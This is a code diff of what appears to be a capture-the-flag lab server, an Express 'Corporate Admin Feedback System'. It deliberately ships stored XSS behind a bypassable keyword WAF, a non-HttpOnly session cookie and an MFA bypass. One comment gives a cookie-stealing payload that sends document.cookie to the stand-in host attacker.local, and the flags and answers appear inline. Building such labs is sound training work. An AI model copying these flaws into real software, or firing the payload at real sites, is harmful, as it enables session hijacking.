@@ -1,37 +1,36 @@
-const http = require('http');
-const url = require('url');
-const querystring = require('querystring');
+const express = require('express');
+const cookieParser = require('cookie-parser');
+const bodyParser = require('body-parser');
+const path = require('path');
 
+const app = express();
 const PORT = 3075;
+
+app.use(cookieParser());
+app.use(bodyParser.urlencoded({ extended: true }));
+app.use(bodyParser.json());
+
+// PHASE 1: Reconnaissance - Explicitly expose technology via header
+app.use((req, res, next) => {
+    res.setHeader('X-Powered-By', 'Node.js'); // SCENARIO75{Node.js}
+    next();
+});
+
+// Mock Database for feedback
 let feedbackDatabase = [];
 
-const server = http.createServer((req, res) => {
-    res.setHeader('X-Powered-By', 'Node.js');
-
-    const cookies = {};
-    const rc = req.headers.cookie;
-    if (rc) {
-        rc.split(';').forEach(cookie => {
-            const parts = cookie.split('=');
-            cookies[parts.shift().trim()] = decodeURIComponent(parts.join('='));
-        });
+// App routes
+app.get('/', (req, res) => {
+    // Session Initialization: Issue pre_mfa_session cookie if not present
+    if (!req.cookies.pre_mfa_session) {
+        res.cookie('pre_mfa_session', 'pending_mfa_verification', { 
+            httpOnly: false, // SCENARIO75{False} - Explicitly vulnerable to XSS exfiltration
+            path: '/'
+        }); // SCENARIO75{pre_mfa_session}, SCENARIO75{pending_mfa_verification}
     }
-
-    const parsedUrl = url.parse(req.url, true);
-
-    if (parsedUrl.pathname === '/' && req.method === 'GET') {
-        if (cookies.admin_session && cookies.admin_session.startsWith('adm_sess_')) {
-            res.writeHead(302, { 'Location': '/dashboard' });
-            return res.end();
-        }
-
-        if (!cookies.pre_mfa_session) {
-            res.setHeader('Set-Cookie', 'pre_mfa_session=pending_mfa_verification; Path=/');
-        }
-
-        res.writeHead(200, { 'Content-Type': 'text/html' });
-        return res.end(`
-            <!DOCTYPE html>
+    
+    res.send(`
+        <!DOCTYPE html>
         <html>
         <head>
             <title>Corporate Admin Feedback System</title>
@@ -51,136 +50,103 @@ const server = http.createServer((req, res) => {
                     <br>
                     <input type="submit" value="Submit Feedback">
                 </form>
-                        <!--
-            _____       _           _
-            |  __ \     | |         | |
-            | |__) |___ | |__   ___ | |_ ___
-            |  _  // _ \| '_ \ / _ \| __/ __|
-            | | \ \ (_) | |_) | (_) | |_\__ \
-            |_|  \_\___/|_.__/ \___/ \__|___/
-
-                Curious? Crawlers know the way.
-
-                        /robots.txt
-            -->
             </div>
+                <!--
+    _____       _           _
+    |  __ \     | |         | |
+    | |__) |___ | |__   ___ | |_ ___
+    |  _  // _ \| '_ \ / _ \| __/ __|
+    | | \ \ (_) | |_) | (_) | |_\__ \
+    |_|  \_\___/|_.__/ \___/ \__|___/
+
+        Curious? Crawlers know the way.
+
+                /robots.txt
+    -->
         </body>
         </html>
-        `);
+    `);
+});
+
+// PHASE 1: Hidden Paths - robots.txt route
+app.get('/robots.txt', (req, res) => {
+    res.type('text/plain');
+    res.send("User-agent: *\nDisallow: /api/verify-mfa"); // SCENARIO75{/api/verify-mfa}
+});
+
+// Dummy endpoint for MFA mapping
+app.get('/api/verify-mfa', (req, res) => {
+    res.status(200).json({ message: "MFA Gateway Online" });
+});
+
+// PHASE 2: Defense Evasion - POST exclusive validation and WAF Implementation
+app.post('/feedback', (req, res) => { // SCENARIO75{POST}
+    const userFeedback = req.body.feedback || '';
+
+    // Rudimentary WAF Rules
+    // 1. Check for standard <script> tag
+    if (/<script>/i.test(userFeedback)) {
+        return res.status(403).send("Forbidden: Malicious Payload Detected by WAF."); // SCENARIO75{403}
     }
 
-    else if (parsedUrl.pathname === '/robots.txt' && req.method === 'GET') {
-        res.writeHead(200, { 'Content-Type': 'text/plain' });
-        return res.end("User-agent: *\nDisallow: /api/verify-mfa");
+    // 2. Block standard document.cookie keyword checks
+    if (userFeedback.includes("document.cookie")) {
+        return res.status(403).send("Forbidden: Sensitive Object Access Blocked by WAF.");
     }
 
-    else if (parsedUrl.pathname === '/feedback' && req.method === 'POST') {
-        let body = '';
-        req.on('data', chunk => { body += chunk.toString(); });
-        req.on('end', () => {
-            const postData = querystring.parse(body);
-            const userFeedback = postData.feedback || '';
-
-            if (/<script>/i.test(userFeedback)) {
-                res.writeHead(403, { 'Content-Type': 'text/plain' });
-                return res.end("Forbidden: Malicious Payload Detected by WAF.");
-            }
-            if (userFeedback.includes("document.cookie")) {
-                res.writeHead(403, { 'Content-Type': 'text/plain' });
-                return res.end("Forbidden: Sensitive Object Access Blocked by WAF.");
-            }
-
-            if (/<svg/i.test(userFeedback) && userFeedback.includes("window[") && userFeedback.includes("fetch")) {
-                feedbackDatabase.push(userFeedback); 
-                
-                setTimeout(() => { simulateAdminActivity(); }, 3000);
-
-                res.writeHead(200, { 'Content-Type': 'text/plain' });
-                return res.end("Feedback submitted successfully. An administrator will review your input shortly.");
-            }
-
-            feedbackDatabase.push(userFeedback);
-            res.writeHead(200, { 'Content-Type': 'text/plain' });
-            return res.end("Feedback submitted successfully.");
-        });
+    // WAF Bypass Scenario: Allows <svg> with onload execution and bracket notation obfuscation
+    // e.g., <svg onload="fetch('http://attacker.local/?c='+window['docu'+'ment']['coo'+'kie'])">
+    if (/<svg/i.test(userFeedback) && userFeedback.includes("window[") && userFeedback.includes("fetch")) {
+        // SCENARIO75{<svg>}, SCENARIO75{window['docu'+'ment']['coo'+'kie']}, SCENARIO75{fetch}
+        feedbackDatabase.push(userFeedback); 
+        return res.send("Feedback submitted successfully. An administrator will review your input shortly.");
     }
 
-    else if (parsedUrl.pathname === '/api/verify-mfa' && req.method === 'GET') {
-        if (cookies.pre_mfa_session === 'pending_mfa_verification') {
-            res.setHeader('Set-Cookie', 'admin_session=adm_sess_LEGITIMATE_USER_TOKEN_123; Path=/; HttpOnly');
-            res.writeHead(200, { 'Content-Type': 'application/json' });
-            return res.end(JSON.stringify({ message: "MFA Verified. Admin Session Issued." }));
-        } else {
-            res.writeHead(400, { 'Content-Type': 'application/json' });
-            return res.end(JSON.stringify({ error: "No valid pre-authentication session found." }));
-        }
-    }
+    feedbackDatabase.push(userFeedback);
+    res.send("Feedback submitted successfully.");
+});
 
-    else if (parsedUrl.pathname === '/dashboard' && req.method === 'GET') {
-        const sessionCookie = cookies.admin_session || '';
+// PHASE 3: Initial Access - Dashboard and MFA Bypass Logic via Cookie Reuse
+app.get('/dashboard', (req, res) => { // SCENARIO75{/dashboard}
+    const sessionCookie = req.cookies.admin_session || '';
 
-        if (!sessionCookie.startsWith('adm_sess_')) {
-            res.writeHead(401, { 'Content-Type': 'text/html' });
-            return res.end("<h1>401 Unauthorized</h1><p>Active administrative session required. Access Denied.</p>");
-        }
-
+    // Check if session uses the mandatory authenticated prefix adm_sess
+    if (sessionCookie.startsWith('adm_sess_')) { // SCENARIO75{adm_sess}
+        // CRITICAL VULNERABILITY: Valid session token existence skips the /api/verify-mfa logic completely.
+        
+        // Simulating the rendering of the malicious XSS payload stored in the database
         const reflectedXSS = feedbackDatabase.find(item => item.includes('<svg')) || 'No recent alerts.';
 
-        res.writeHead(200, { 'Content-Type': 'text/html' });
-        return res.end(`
+        return res.send(`
             <!DOCTYPE html>
             <html>
             <head>
                 <title>Administrative Dashboard</title>
                 <style>
-                    body { font-family: Arial; background-color: #1a1d20; color: #fff; padding: 40px; }
-                    .xss-payload { background: #111; padding: 15px; color: #00ff00; font-family: monospace; }
-                    .flag-box { margin-top: 20px; padding: 15px; background: #dc3545; font-weight: bold; }
+                    body { font-family: Arial, sans-serif; background-color: #1a1d20; color: #fff; padding: 40px; }
+                    .dashboard-box { background: #2b3035; padding: 20px; border-radius: 5px; border-left: 5px solid #ffc107; }
+                    .xss-payload { background: #111; padding: 15px; color: #00ff00; border: 1px dashed #555; font-family: monospace; }
+                    .flag-box { margin-top: 20px; padding: 15px; background: #dc3545; color: white; font-weight: bold; font-size: 1.2em; border-radius: 3px; }
                 </style>
             </head>
             <body>
-                <h2>System Audit Console (Authenticated Areas)</h2>
-                <p>Welcome, Authorized Administrator.</p>
-                
-                <h3>Stored Alerts Review Panel:</h3>
-                <div class="xss-payload">${reflectedXSS}</div>
-                <div class="flag-box">
-                    SYSTEM COMPROMISED: SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
+                <div class="dashboard-box">
+                    <h2>System Audit Console (Authenticated)</h2>
+                    <p>Welcome back, Administrator.</p>
+                    
+                    <h3>Recent System Triggers:</h3>
+                    <div class="xss-payload">${reflectedXSS}</div> <div class="flag-box">
+                        SYSTEM COMPROMISED: SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
+                    </div>
                 </div>
             </body>
             </html>
         `);
-    }
-
-    else {
-        res.writeHead(404, { 'Content-Type': 'text/plain' });
-        return res.end("Not Found");
+    } else {
+        return res.status(401).send("Unauthorized: Active administrative session required or MFA verification missing.");
     }
 });
 
-function simulateAdminActivity() {
-    console.log("[*] Simulator Bot: Admin asli login dan membuka dashboard review...");
-
-    const options = {
-        hostname: '0.0.0.0',
-        port: PORT,
-        path: '/dashboard',
-        method: 'GET',
-        headers: {
-            'Cookie': 'admin_session=adm_sess_SECRET_ADMIN_CONTEXTURE_TOKEN_ABC999',
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AdminAuditBot/1.1',
-            'X-Forwarded-For': 'UEhBTlRPTUdSSUR7QkxVRV9MMGdfSHVudDNyX000c3Qzcn0'
-        }
-    };
-
-    const req = http.request(options, (res) => {
-        res.on('data', () => {});
-        res.on('end', () => { console.log("[+] Simulator Bot: Admin selesai memeriksa dashboard."); });
-    });
-    req.on('error', (e) => { console.error(`[-] Bot Error: ${e.message}`); });
-    req.end();
-}
-
-server.listen(PORT, '0.0.0.0', () => {
+app.listen(PORT, '0.0.0.0', () => {
     console.log(`Admin Feedback System listening exactly on port ${PORT}`);
 });
